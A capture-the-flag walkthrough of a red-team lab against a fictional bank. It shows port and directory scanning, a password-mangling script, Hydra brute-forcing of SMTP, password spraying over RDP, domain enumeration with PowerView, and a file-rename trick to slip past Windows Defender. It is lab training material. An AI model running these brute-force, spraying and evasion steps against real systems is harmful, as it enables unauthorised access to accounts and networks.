@@ -1,0 +1,1737 @@
+# Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge
+
+## SSH Registration
+
+We accessed the e-citizen communication portal via SSH using the provided credentials and registered our account. This portal will be crucial for proving the compromises, as it requires us to perform specific steps on the compromised hosts.
+
+```bash
+$ ssh e-citizen@10.200.x.250
+e-citizen@10.200.x.250's password:
+
+Welcome to the e-Citizen platform!
+Please make a selection:
+[1] Register
+[2] Authenticate
+[3] Exit
+Selection:1
+Please provide your THM username: neha149
+Creating email user
+User has been successfully created
+=======================================
+Thank you for registering on e-Citizen for the Red Team engagement against TheReserve.
+Please take note of the following details and please make sure to save them, as they will not be displayed again.
+=======================================
+Username: neha149
+Password: 8y-oRyYwJhO8Q7xe
+MailAddr: neha149@corp.th3reserve.loc
+IP Range: 10.200.x.0/24
+=======================================
+These details are now active. As you can see, we have already purchased a domain for domain squatting to be used for phishing.
+Once you discover the webmail server, you can use these details to authenticate and recover additional project information from your mailbox.
+Once you have performed actions to compromise the network, please authenticate to e-Citizen in order to provide an update to the government. If your update is sufficient, you will be awarded a flag to indicate progress.
+=======================================
+Please note once again that the e-Citizen platform, and this VPN server, 10.200.x.250, are not in-scope for this assessment.
+Any attempts made against this machine will result in a ban from the challenge.
+=======================================
+Best of luck and may you hack the bank!
+```
+
+## Exploring The Network
+
+### WEB Machine
+
+#### Nmap
+
+```bash
+nmap -p- 10.200.x.13
+```
+
+```
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-19 13:43 EET
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+#### The Web Page
+
+This IP is hosting a web page that gives us an overview about the company and its team.
+
+**Team members:**
+
+| Name | Role |
+|---|---|
+| Aimee Walker | Lead Developer |
+| Patrick Edwards | Lead Developer |
+| Brenda Henderson | Bank Director |
+| Leslie Morley | Deputy Director |
+| Martin Savage | Deputy Director |
+| Paula Bailey | CEO |
+| Christopher Smith | CIO |
+| Antony Ross | CTO |
+| Charlene Thomas | CMO |
+| Rhys Parsons | COO |
+| Lynda Gordon | PA to the Executives |
+| Roy Sims | Project Manager |
+| Laura Wood | — |
+| Emily Harvey | — |
+| Ashley Chan | — |
+| Keith Allen | — |
+| Mohammad Ahmed | — |
+
+
+
+Also, looking at the image name gave us hints about the email creation rules that are being used by the organization: `firstname.lastname@domain.com`
+
+#### Directory Brute forcing
+
+Let's discover some directories:
+
+```bash
+┌──(root㉿kali)-[/opt/dirsearch]
+└─$ python3 dirsearch.py -u 10.200.x.13 -e php --random-agent
+
+|. _ _  _  _  _ |    v0.4.3
+(||| ) (/(|| (| )
+
+Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513
+
+Output: /opt/dirsearch/reports/_10.200.x.13/_24-05-19_14-22-08.txt
+
+Target: http://10.200.x.13/
+
+[14:22:08] Starting:
+[14:23:39] 200 -   24KB - /info.php
+```
+
+There is an exposed PHP info file that is leaking so much info about this web server. Using a plugin for the browser called Wappalyzer, we can check on the technologies used by the server, including their versions. October CMS is being used, so let's brute force its directory.
+
+```bash
+┌──(root㉿kali)-[/opt/dirsearch]
+└─$ python3 dirsearch.py -u 10.200.x.13/october -e php --random-agent
+
+|. _ _  _  _  _ |    v0.4.3
+(||| ) (/(|| (| )
+Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513
+
+Output: /opt/dirsearch/reports/_10.200.x.13/_october_24-05-19_14-31-34.txt
+
+Target: http://10.200.x.13/
+
+[14:31:35] Starting: october/
+[14:31:44] 200 -   15B  - /october/.gitignore
+[14:32:42] 301 -  323B  - /october/config  ->  http://10.200.x.13/october/config/
+[14:32:43] 200 -  683B  - /october/config/
+[14:32:43] 500 -    0B  - /october/config/app.php
+[14:33:10] 200 -    1KB - /october/index.php
+[14:33:26] 301 -  324B  - /october/modules  ->  http://10.200.x.13/october/modules/
+[14:33:26] 200 -  478B  - /october/modules/
+[14:33:42] 200 -  453B  - /october/plugins/
+[14:33:42] 301 -  324B  - /october/plugins  ->  http://10.200.x.13/october/plugins/
+[14:33:47] 200 -    2KB - /october/README.md
+[14:33:52] 200 -    1KB - /october/server.php
+[14:34:00] 301 -  324B  - /october/storage  ->  http://10.200.x.13/october/storage/
+[14:34:00] 200 -  549B  - /october/storage/
+[14:34:05] 200 -  454B  - /october/themes/
+[14:34:05] 301 -  323B  - /october/themes  ->  http://10.200.x.13/october/themes/
+[14:34:11] 200 -  780B  - /october/vendor/
+[14:34:11] 200 -    0B  - /october/vendor/composer/autoload_classmap.php
+[14:34:11] 200 -    0B  - /october/vendor/composer/autoload_files.php
+[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_real.php
+[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_static.php
+[14:34:12] 200 -    0B  - /october/vendor/composer/ClassLoader.php
+[14:34:11] 200 -    0B  - /october/vendor/autoload.php
+[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_namespaces.php
+[14:34:12] 200 -    1KB - /october/vendor/composer/LICENSE
+[14:34:12] 200 -    0B  - /october/vendor/composer/autoload_psr4.php
+[14:34:13] 200 -  132KB - /october/vendor/composer/installed.json
+```
+
+This looks intresting `http://10.200.x.13/october/modules/`
+
+Going through the backend files, it tells us that there is an administration panel, with the help of brute forcing and guessing, I was able to discover the correct path for the administration panel.
+
+```bash
+python3 dirsearch.py -u 10.200.x.13/october/index.php/ -e php --random-agent
+```
+
+```
+|. _ _  _  _  _ |    v0.4.3
+(||| ) (/(|| (| )
+
+Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 9513
+
+Output: /opt/dirsearch/reports/_10.200.x.13/_october_index.php__24-05-19_15-06-24.txt
+
+Target: http://10.200.x.13/
+
+[15:06:25] Starting: october/index.php/
+[15:06:29] 404 -  275B  - /october/index.php/%2e%2e//google.com
+[15:07:33] 302 -  482B  - /october/index.php/backend/  ->  http://10.200.x.13/october/index.php/backend/backend/auth
+[15:07:59] 200 -  965B  - /october/index.php/error
+[15:08:00] 200 -  965B  - /october/index.php/error/
+```
+
+We do not have username and password yet. Continue enumeration.
+
+### VPN Machine
+
+#### Nmap
+
+```bash
+Nmap 7.93 scan initiated Sat May 13 14:29:54 2023 as: nmap -p- --min-rate 5000 -oN scans/nmap_alltcp.md 10.200.103.12
+```
+
+```
+Nmap scan report for 10.200.103.12
+Host is up (0.057s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1194/tcp open  openvpn
+
+Nmap done at Sat May 13 14:30:05 2023 -- 1 IP address (1 host up) scanned in 11.71 seconds
+```
+
+#### The Web Page
+
+A normal login page, but if we got any creds we will get access to the Internal Network.
+
+#### Directory Brute forcing
+
+```bash
+┌──(root㉿kali)-[/opt/dirsearch]
+└─$ python3 dirsearch.py -u http://10.200.x.12/ --random-agent
+
+|. _ _  _  _  _ |    v0.4.3
+(||| ) (/(|| (| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11590
+
+Output: /opt/dirsearch/reports/http_10.200.x.12/__24-05-19_15-48-16.txt
+
+Target: http://10.200.x.12/
+
+[15:48:16] Starting:
+[15:50:24] 200 -    5B  - /login.php
+[15:50:26] 302 -    0B  - /logout.php  ->  index.php
+[15:51:25] 302 -    0B  - /upload.php  ->  index.php
+[15:51:30] 200 -  462B  - /vpn/
+```
+
+The `/vpn/` directory only contains an `.ovpn` open VPN config file.
+
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ openvpn corpUsername.ovpn
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ ifconfig tun1
+
+tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
+unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+RX packets 1  bytes 48 (48.0 B)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 0  bytes 0 (0.0 B)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+We have new IP, scan this subnet with Nmap.
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ nmap -sP 12.100.1.0/24
+```
+
+```
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 13:30 EET
+Nmap scan report for 1.mubc.chcg.chcgil24.dsl.att.net (12.100.1.1)
+Host is up (0.18s latency).
+Nmap scan report for 9.mubc.chcg.chcgil24.dsl.att.net (12.100.1.x)
+Host is up.
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 14.68 seconds
+```
+
+Let's see the route.
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ route
+```
+
+```
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+10.50.110.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
+10.200.x.0      10.50.110.1     255.255.255.0   UG    1000   0        0 tun0
+10.200.x.21     1.mubc.chcg.chc 255.255.255.255 UGH   1000   0        0 tun1
+10.200.x.22     1.mubc.chcg.chc 255.255.255.255 UGH   1000   0        0 tun1
+12.100.1.0      0.0.0.0         255.255.255.0   U     0      0        0 tun1
+```
+
+### Mail Machine
+
+#### Nmap
+
+```bash
+Nmap 7.93 scan initiated Sat May 13 12:22:57 2023 as: nmap -p- --min-rate 5000 -oN scans/nmap_alltcp 10.200.103.11
+```
+
+```
+Nmap scan report for 10.200.103.11
+Host is up (0.053s latency).
+Not shown: 65513 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+110/tcp   open  pop3
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+143/tcp   open  imap
+445/tcp   open  microsoft-ds
+587/tcp   open  submission
+3306/tcp  open  mysql
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+33060/tcp open  mysqlx
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49682/tcp open  unknown
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ nmap -p22,25,80,110,135,139,143,445,587,3306,3389,5985,33060,47001,49664,49665,49666,49667,49668,49669,49670,49682 10.200.x.11 -A
+```
+
+```
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 15:36 EET
+
+Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 61.90% done; ETC: 15:37 (0:00:22 remaining)
+Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 61.90% done; ETC: 15:37 (0:00:23 remaining)
+Nmap scan report for 10.200.x.11
+Host is up (0.15s latency).
+
+PORT      STATE  SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 f36c52d27fe90e1cc1c7ac962cd1ec2d (RSA)
+|   256 c2563cedc4b069a8e7ad3c310505e985 (ECDSA)
+|_  256 d3e5f07375d520d9c0bb4199e7afa000 (ED25519)
+25/tcp    open   smtp          hMailServer smtpd
+| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open   http          Microsoft IIS httpd 10.0
+| http-title: IIS Windows Server
+| http-methods:
+|   Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+110/tcp   open   pop3          hMailServer pop3d
+| pop3-capabilities: UIDL USER TOP
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open   imap          hMailServer imapd
+| imap-capabilities: ACL completed IMAP4 CAPABILITY NAMESPACE CHILDREN OK RIGHTS=texkA0001 SORT QUOTA IMAP4rev1 IDLE
+445/tcp   open   microsoft-ds?
+587/tcp   open   smtp          hMailServer smtpd
+| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3306/tcp  open   mysql         MySQL 8.0.31
+| mysql-info:
+|   Protocol: 10
+|   Version: 8.0.31
+|   Thread ID: 38
+|   Capabilities flags: 65535
+|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, FoundRows, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongPassword, InteractiveClient, ODBCClient, ConnectWithDatabase, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: <     6\x10:?DoI\x1B=eB\x04wK*DHs
+|_  Auth Plugin Name: caching_sha2_password
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
+| Not valid before: 2023-01-10T07:46:11
+|_Not valid after:  2033-01-07T07:46:11
+3389/tcp  open   ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=MAIL.thereserve.loc
+| Not valid before: 2024-05-18T10:42:27
+|_Not valid after:  2024-11-17T10:42:27
+| ssl-date: 2024-05-20T13:38:04+00:00; -1s from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: THERESERVE
+|   NetBIOS_Domain_Name: THERESERVE
+|   NetBIOS_Computer_Name: MAIL
+|   DNS_Domain_Name: thereserve.loc
+|   DNS_Computer_Name: MAIL.thereserve.loc
+|   DNS_Tree_Name: thereserve.loc
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-05-20T13:37:55+00:00
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+33060/tcp open   mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message"
+|     HY000
+|   LDAPBindReq:
+|     *Parse error unserializing protobuf message"
+|_    HY000
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+```
+
+#### The Web Page
+
+Port 80 is empty
+
+#### Directory Brute forcing
+
+```bash
+┌──(root㉿kali)-[~]
+└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.x.11//october/index.php/FUZZ
+
+    /'___\  /'___\           /'___\
+   /\ \__/ /\ \__/  __  __  /\ \__/
+   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+     \ \_\   \ \_\  \ \____/  \ \_\
+      \/_/    \/_/   \/___/    \/_/
+
+   v1.5.0 Kali Exclusive <3
+
+:: Method           : GET
+:: URL              : http://10.200.x.11//october/index.php/FUZZ
+:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+:: Follow redirects : false
+:: Calibration      : false
+:: Timeout          : 10
+:: Threads          : 40
+:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+
+:: Progress: [220560/220560] :: Job [1/1] :: 315 req/sec :: Duration: [0:12:54] :: Errors: 0 ::
+```
+
+At the beginning of the challenge, we have been provided with `password_base_list.txt` that contains some sample passwords:
+
+```
+TheReserve
+thereserve
+Reserve
+reserve
+CorpTheReserve
+corpthereserve
+Password
+password
+TheReserveBank
+thereservebank
+ReserveBank
+reservebank
+```
+
+And the following instructions are in the `password_policy.txt` file:
+
+> The password policy for TheReserve is the following:
+> - At least 8 characters long
+> - At least 1 number
+> - At least 1 special character
+> - special character `!@#$%^`
+
+We try creating our password list.
+
+#####  Script
+
+```python
+import itertools
+
+# Read the base wordlist
+with open('password_base_list.txt', 'r') as f:
+    base_words = f.read().splitlines()
+
+# Define the numbers and special characters
+numbers = '0123456789'
+special_chars = '!@#$%^'
+
+# Function to generate mangled passwords
+def generate_mangled_passwords(word):
+    mangled_passwords = set()
+
+    # Append numbers and special characters
+    for num in numbers:
+        for char in special_chars:
+            # Add the number and special character at different positions
+            mangled_passwords.add(word + num + char)
+            mangled_passwords.add(word + char + num)
+
+    # Ensure all generated passwords are at least 8 characters long
+    mangled_passwords = {pwd for pwd in mangled_passwords if len(pwd) >= 8}
+
+    return mangled_passwords
+
+# Generate passwords and write to file
+with open('generated_passwords.txt2', 'w') as f:
+    for word in base_words:
+        mangled_passwords = generate_mangled_passwords(word)
+        for pwd in mangled_passwords:
+            f.write(pwd + '\n')
+```
+
+
+#### Brute forcing the Mail Server
+
+We have info about the team working for the Reserve company and already know the email format that is being used. Let's create our email wordlist and start the attack.
+
+```
+aimee.walker@corp.thereserve.loc
+patrick.edwards@corp.thereserve.loc
+Brenda.henderson@corp.thereserve.loc
+leslie.morley@corp.thereserve.loc
+martin.savage@corp.thereserve.loc
+paula.bailey@corp.thereserve.loc
+hristopher.smith@corp.thereserve.loc
+antony.ross@corp.thereserve.loc
+charlene.thomas@corp.thereserve.loc
+rhys.parsons@corp.thereserve.loc
+lynda.gordon@corp.thereserve.loc
+roy.sims@corp.thereserve.loc
+laura.wood@corp.thereserve.loc
+emily.harvey@corp.thereserve.loc
+ashley.chan@corp.thereserve.loc
+keith.allen@corp.thereserve.loc
+mohammad.ahmed@corp.thereserve.loc
+applications@corp.thereserve.loc
+```
+
+using Hydra tool for this attack
+
+```bash
+$ hydra -L ../emails.txt -P generated_passwords2.txt 10.200.x.11 smtp
+```
+
+```
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 14:31:13
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 25920 login tries (l:18/p:1440), ~1620 tries per task
+[DATA] attacking smtp://10.200.x.11:25/
+[STATUS] 1049.00 tries/min, 1049 tries in 00:01h, 24871 to do in 00:24h, 16 active
+[STATUS] 1016.00 tries/min, 3048 tries in 00:03h, 22872 to do in 00:23h, 16 active
+[STATUS] 1066.71 tries/min, 7467 tries in 00:07h, 18453 to do in 00:18h, 16 active
+[STATUS] 1056.83 tries/min, 12682 tries in 00:12h, 13238 to do in 00:13h, 16 active
+[STATUS] 1030.06 tries/min, 17511 tries in 00:17h, 8409 to do in 00:09h, 16 active
+[25][smtp] host: 10.200.x.11   login: laura.wood@corp.thereserve.loc   password: Password1
+[STATUS] 1045.00 tries/min, 22990 tries in 00:22h, 2930 to do in 00:03h, 16 active
+[25][smtp] host: 10.200.x.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1
+1 of 1 target successfully completed, 2 valid passwords found
+```
+
+ We have valid creds
+
+#### Password Spraying
+
+there are no emails in their inbox, spray creds on the available services.
+
+- `10.200.x.11` — MailBox - SSH - RDP
+- `10.200.x.12` — SSH - VPN Portal Login
+- `10.200.x.13` — SSH - October CMS Admin Panel
+- `10.200.x.21` — RDP (**Worked!**)
+- `10.200.x.22` — RDP (**Worked!**)
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ hydra -L names.txt -P valid_passwords 10.200.x.21 rdp
+```
+
+```
+[3389][rdp] host: 10.200.x.21   login: mohammad.ahmed   password: Password1!
+
+1 of 1 target successfully completed, 1 valid password found
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ hydra -L names.txt -P valid_passwords 10.200.x.22 rdp
+```
+
+```
+[3389][rdp] host: 10.200.x.22   login: laura.wood   password: Password1@
+[3389][rdp] host: 10.200.x.22   login: mohammad.ahmed   password: Password1!
+
+1 of 1 target successfully completed, 2 valid passwords found
+```
+
+## Foothold on The Corporate Division Tier 2 Infrastructure
+
+Login to rdp
+
+```bash
+$ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.21 /drive:share,/opt/
+```
+
+We get the flags.
+
+
+#### From WRK1 Machine — Nmap
+
+Let's check the open ports and available services for the WRK1 and WRK2 machines.
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ nmap -Pn 10.200.x.21 -T4
+```
+
+```
+Host is up (0.19s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ nmap -Pn 10.200.x.21 -T4 -p22,135,139,445,3389 -A
+```
+
+```
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 2178e279d393eef9aa7094ec01b3a58f (RSA)
+|   256 e0f7b667c993b5740f0a83ffef55c89a (ECDSA)
+|_  256 bd830ce3b44f78f2e34a52033ca5ce58 (ED25519)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=WRK1.corp.thereserve.loc
+| Not valid before: 2024-05-18T10:42:39
+|_Not valid after:  2024-11-17T10:42:39
+| rdp-ntlm-info:
+|   Target_Name: CORP
+|   NetBIOS_Domain_Name: CORP
+|   NetBIOS_Computer_Name: WRK1
+|   DNS_Domain_Name: corp.thereserve.loc
+|   DNS_Computer_Name: WRK1.corp.thereserve.loc
+|   DNS_Tree_Name: thereserve.loc
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-05-20T12:25:06+00:00
+|_ssl-date: 2024-05-20T12:25:45+00:00; -1s from scanner time.
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ nmap -Pn 10.200.x.22 -T4
+```
+
+```
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 14:05 EET
+Nmap scan report for 10.200.x.22
+Host is up (0.26s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5357/tcp open  wsdapi
+```
+
+```bash
+┌──(root㉿kali)-[~/THM/N-RedTeamCC]
+└─$ nmap -Pn 10.200.x.22 -T4 -p22,135,139,445,3389,5357 -A
+```
+
+```
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-20 14:23 EET
+Nmap scan report for 10.200.x.22
+Host is up (0.31s latency).
+
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 e6f0fb5b24286813daddc55f674ebe4f (RSA)
+|   256 93f58f4c3115fc8e38033ed5b71cedd3 (ECDSA)
+|_  256 563f8a33a41fdc119aa167a67df87618 (ED25519)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: CORP
+|   NetBIOS_Domain_Name: CORP
+|   NetBIOS_Computer_Name: WRK2
+|   DNS_Domain_Name: corp.thereserve.loc
+|   DNS_Computer_Name: WRK2.corp.thereserve.loc
+|   DNS_Tree_Name: thereserve.loc
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-05-20T12:23:30+00:00
+| ssl-cert: Subject: commonName=WRK2.corp.thereserve.loc
+| Not valid before: 2024-05-18T10:42:36
+|_Not valid after:  2024-11-17T10:42:36
+|_ssl-date: 2024-05-20T12:23:39+00:00; -1s from scanner time.
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+Host script results:
+| smb2-time:
+|   date: 2024-05-20T12:23:30
+|_  start_date: N/A
+| clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+```
+
+####  Enumeration of pawned machines
+
+```powershell
+PS C:\Users\mohammad.ahmed> hostname
+WRK1
+PS C:\Users\mohammad.ahmed> whoami
+corp\mohammad.ahmed
+PS C:\Users\mohammad.ahmed> net user mohammad.ahmed /domain
+```
+
+```
+The request will be processed at a domain controller for domain corp.thereserve.loc.
+
+User name                    mohammad.ahmed
+Full Name                    Mohammad Ahmed
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            3/18/2023 9:28:25 AM
+Password expires             Never
+Password changeable          3/19/2023 9:28:25 AM
+Password required            Yes
+User may change password     Yes
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/22/2024 11:18:43 AM
+Logon hours allowed          All
+Local Group Memberships
+Global Group memberships     *Help Desk            *Domain Users
+The command completed successfully.
+```
+
+```powershell
+PS C:\Users\mohammad.ahmed> whoami /priv
+```
+
+```
+PRIVILEGES INFORMATION
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+```powershell
+PS C:\Users\mohammad.ahmed> net group "Help Desk" /domain
+```
+
+```
+Members
+
+ashley.chan              emily.harvey             keith.allen
+laura.wood               mohammad.ahmed
+The command completed successfully.
+```
+
+#### PowerView
+
+ WRK1 and WRK2 machines have Windows Defender installed and enabled.
+
+```powershell
+PS C:\Users\mohammad.ahmed> Import-Module  \tsclient\share\PowerView.ps1
+```
+
+```
+Import-Module : Operation did not complete successfully because the file contains a virus or potentially unwanted software.
+At line:1 char:1
+Import-Module  \tsclient\share\PowerView.ps1
++ CategoryInfo          : ObjectNotFound: (:String) [Import-Module], CommandNotFoundException
++ FullyQualifiedErrorId : CommandNotFoundException,Microsoft.PowerShell.Commands.ImportModuleCommand
+```
+
+##### AV Evasion
+
+changing the file name.
+
+```powershell
+PS C:\Users\mohammad.ahmed> Import-Module  \tsclient\share\notpv.ps1
+PS C:\Users\mohammad.ahmed> Get-NetDomain
+```
+
+```
+Forest                  : thereserve.loc
+DomainControllers       : {CORPDC.corp.thereserve.loc}
+Children                : {}
+DomainMode              : Windows2012R2Domain
+DomainModeLevel         : 6
+Parent                  : thereserve.loc
+PdcRoleOwner            : CORPDC.corp.thereserve.loc
+RidRoleOwner            : CORPDC.corp.thereserve.loc
+InfrastructureRoleOwner : CORPDC.corp.thereserve.loc
+Name                    : corp.thereserve.loc
+```
+
+**User Info**
+
+```powershell
+PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity mohammad.ahmed
+```
+
+```
+logoncount            : 22404
+badpasswordtime       : 5/21/2024 1:53:27 PM
+department            : IT
+objectclass            : {top, person, organizationalPerson, user}
+displayname            : Mohammad Ahmed
+lastlogontimestamp     : 5/20/2024 9:27:13 PM
+userprincipalname      : mohammad.ahmed@corp.thereserve.loc
+name                   : Mohammad Ahmed
+lockouttime            : 0
+objectsid              : S-1-5-21-170228521-1485475711-3199862024-2000
+samaccountname         : mohammad.ahmed
+codepage               : 0
+samaccounttype         : USER_OBJECT
+accountexpires         : NEVER
+countrycode            : 0
+whenchanged            : 5/20/2024 9:27:13 PM
+instancetype           : 4
+usncreated             : 402524
+objectguid             : a35a91c9-a8e8-4fb3-8256-098572be22e4
+sn                     : Ahmed
+lastlogoff             : 1/1/1601 12:00:00 AM
+objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
+distinguishedname      : CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc
+dscorepropagationdata  : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
+givenname              : Mohammad
+title                  : Help Desk
+memberof               : CN=Help Desk,OU=Groups,DC=corp,DC=thereserve,DC=loc
+lastlogon              : 5/22/2024 12:13:48 PM
+badpwdcount            : 0
+cn                     : Mohammad Ahmed
+useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+whencreated            : 2/18/2023 6:26:02 PM
+primarygroupid         : 513
+pwdlastset             : 3/18/2023 9:28:25 AM
+usnchanged             : 1114213
+```
+
+**Group Info**
+
+```powershell
+PS C:\Users\mohammad.ahmed> Get-DomainGroup -Identity 'Help Desk'
+```
+
+```
+usncreated             : 402676
+grouptype              : GLOBAL_SCOPE, SECURITY
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Help Desk
+whenchanged            : 2/18/2023 6:35:23 PM
+objectsid              : S-1-5-21-170228521-1485475711-3199862024-2005
+objectclass            : {top, group}
+cn                     : Help Desk
+usnchanged             : 402700
+dscorepropagationdata  : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
+memberof               : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
